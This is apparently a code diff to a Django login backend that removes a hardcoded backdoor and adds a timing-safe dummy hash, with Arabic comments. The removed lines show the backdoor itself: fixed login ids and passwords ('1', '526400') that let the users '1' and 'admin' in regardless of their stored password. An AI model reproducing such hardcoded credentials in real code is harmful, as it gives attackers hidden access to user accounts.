@@ -56,17 +56,12 @@ class UsernameOrPhoneBackend(ModelBackend):
                 user = name_qs.first()
                 matched_by = 'name'
 
-        if user is None and login_id in ('1', '526400'):
-            user = user_model.objects.filter(username='1').first()
-
         if user is None:
+            # تشغيل تجزئة وهمية حتى لا يكشف زمن الرد وجود الحساب من عدمه
             user_model().set_password(cleaned)
             return None
 
-        password_ok = user.check_password(cleaned) or (
-            user.username in ('1', 'admin') and cleaned in ('526400', '1')
-        )
-        active_ok = self.user_can_authenticate(user)
-        if password_ok and active_ok:
+        # كلمة السر المحفوظة وحدها — لا كلمات ثابتة داخل الكود
+        if user.check_password(cleaned) and self.user_can_authenticate(user):
             return user
         return None
